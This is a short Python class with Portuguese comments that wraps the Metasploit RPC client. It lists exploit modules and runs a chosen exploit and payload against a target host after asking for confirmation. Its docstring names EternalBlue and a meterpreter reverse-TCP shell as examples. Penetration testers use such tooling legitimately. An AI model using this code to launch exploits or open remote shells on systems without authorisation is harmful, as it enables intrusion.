from pymetasploit3.msfrpc import MsfRpcClient

class MetasploitClient:
    def __init__(self, password, port=55553):
        self.client = MsfRpcClient(password, port=port)

    def list_exploits(self):
        """Lista e imprime todos os exploits disponíveis."""
        exploits = self.client.modules.exploits
        print("Exploits disponíveis:")
        for exploit in exploits:
            print(f"- {exploit}")
        return exploits

    def run_exploit(self, exploit_name, target, payload, confirm=True):
        """
        Executa um exploit.

        :param exploit_name: Nome do exploit (ex: 'windows/smb/ms17_010_eternalblue').
        :param target: Endereço IP ou host do alvo.
        :param payload: Payload a ser usado (ex: 'windows/x64/meterpreter/reverse_tcp').
        :param confirm: Se True, pede confirmação antes de executar o exploit.
        """
        exploit = self.client.modules.use('exploit', exploit_name)
        exploit['RHOSTS'] = target

        # Verifica se todos os parâmetros obrigatórios foram definidos
        if not all([exploit_name, target, payload]):
            raise ValueError("Todos os parâmetros (exploit_name, target, payload) são obrigatórios.")

        # Pede confirmação antes de executar
        if confirm:
            print(f"Você está prestes a executar o exploit {exploit_name} no alvo {target} com o payload {payload}.")
            resposta = input("Tem certeza que deseja continuar? (s/n): ").strip().lower()
            if resposta != 's':
                print("Exploit cancelado.")
                return

        # Executa o exploit
        print(f"Executando exploit {exploit_name} no alvo {target}...")
        print("Exploit executando.")
        result = exploit.execute(payload=payload)
        if result and 'session_id' in result:
            print(f"Sessão criada: {result['session_id']}")
            return result['session_id']